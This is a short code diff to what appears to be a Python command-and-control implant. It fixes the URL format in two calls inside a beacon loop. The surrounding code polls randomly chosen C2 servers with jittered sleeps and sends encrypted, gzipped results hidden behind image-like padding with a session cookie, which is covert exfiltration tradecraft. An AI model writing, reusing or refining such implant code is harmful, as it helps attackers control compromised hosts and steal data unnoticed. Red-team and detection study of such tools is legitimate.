@@ -110,7 +110,7 @@ while(True):
     try:
       this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
       time.sleep(this_timer)
-      html = send_request("%%s%%s" %% (random.choice(urls), uri))
+      html = send_request("/%%s%%s" %% (random.choice(urls), uri))
     except Exception as e:
       print("error %%s" %% e)
     if html:
@@ -219,7 +219,7 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            response = send_request("%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
+            response = send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
 
       except Exception as e:
         print(e)
